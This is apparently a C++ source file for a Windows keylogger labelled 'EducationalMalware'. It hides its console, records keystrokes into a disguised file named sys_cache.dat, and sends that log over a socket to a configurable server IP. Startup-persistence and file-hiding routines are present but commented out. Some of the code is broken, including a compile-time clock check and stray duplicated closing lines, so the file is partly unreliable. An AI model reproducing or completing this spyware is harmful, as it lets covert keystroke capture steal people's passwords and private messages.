#include <iostream>
#include <ws2tcpip.h>
#include <string>
#include <windows.h>
#include <initguid.h> // Important: Ensures GUIDs are defined
#include <objbase.h>
#include <shlobj.h> // For startup shortcut
#include <fstream>
#include <conio.h> // For keylogging
#include <thread>  // For background execution
#include <vector>
#include <winsock2.h>
#include <ctime>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

// MinGW being irritating
DEFINE_GUID(IID_IPersistFile,
            0x0000010B, 0x0000, 0x0000,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46);
// Paths
std::string exeName = "EducationalMalware.exe";
std::string hiddenDir = "C:\\ProgramData\\EducationalMalware\\";
std::string hiddenExePath = hiddenDir + "Hidden.exe";
std::string startupShortcutName = "EducationalMalware";

#define SERVER_IP "127.0.0.1" // Change this to your server's IP
#define SERVER_PORT 5000      // Choose a safe port

std::string getCurrentTime()
{
    time_t now = time(0);
    struct tm tstruct;
    char buffer[80];
    tstruct = *localtime(&now);
    strftime(buffer, sizeof(buffer), "%H:%M", &tstruct);
    return std::string(buffer);
}

void sendLogs(const std::string &filename)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    std::ifstream logFile(filename, std::ios::binary);
    if (!logFile)
    {
        return;
    }

    std::string logContent((std::istreambuf_iterator<char>(logFile)), std::istreambuf_iterator<char>());
    logFile.close();

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        return;
    }

    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET)
    {
        WSACleanup();
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
    {
        closesocket(s);
        WSACleanup();
        return;
    }

    send(s, logContent.c_str(), logContent.length(), 0);

    closesocket(s);
    WSACleanup();
}

// Function to simulate keylogging
void logKeys()
{
    static std::ofstream logFile("sys_cache.dat", std::ios::app); // Static to retain state

    for (unsigned char key = 8; key < 255; key++)
    {
        if (GetAsyncKeyState(key) & 0x8000)
        {
            logFile << key;
            logFile.flush();
        }
    }
}

// Function to add program to startup (commented out for now)
// void addToStartup(const std::string &exePath)
//{
//    char startupPath[MAX_PATH];
//    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
//    {
//        std::string shortcutPath = std::string(startupPath) + "\\" + startupShortcutName + ".lnk";
//
//       CoInitialize(NULL);
//        IShellLink *shellLink = NULL;
//        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&shellLink)))
//        {
//            shellLink->SetPath(exePath.c_str());
//
//            IPersistFile *persistFile = NULL;
//            if (SUCCEEDED(shellLink->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
//            {
//                WCHAR widePath[MAX_PATH];
//                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, widePath, MAX_PATH);
//                persistFile->Save(widePath, TRUE);
//                persistFile->Release();
//            }
//            shellLink->Release();
//        }
//        CoUninitialize();
//    }
//}

// Function to move and hide the file
// void hideFile()
//{
//    CreateDirectory(hiddenDir.c_str(), NULL);
//    if (MoveFile(exeName.c_str(), hiddenExePath.c_str()))
//    {
//        SetFileAttributes(hiddenExePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
//    }
//}

// Function to simulate network spreading (fake)

// Function to simulate spyware behavior

// Function to run in background
void runInBackground()
{
    HWND hWnd = GetConsoleWindow();
    if (hWnd != NULL)
        ShowWindow(hWnd, SW_HIDE);
}

// Main function
int main()
{
    runInBackground();                // Call the function to hide the console
    std::string targetTime = "23:59"; // Time to send logs
    std::string lastCheckedTime = "";

    while (true)
    {
        std::string currentTime = __TIME__; // Get system time
        // Send logs only at the target time, once per day
        if (currentTime == targetTime && lastCheckedTime != targetTime)
        {
            sendLogs("sys_cache.dat");
            lastCheckedTime = targetTime; // Prevents duplicate sending
        }
        logKeys(); // Keep logging keys continuously
        // Light delay without blocking execution
        for (volatile int i = 0; i < 1000000; i++)
            ;
    }

    return 0;
}

    return 0;
}

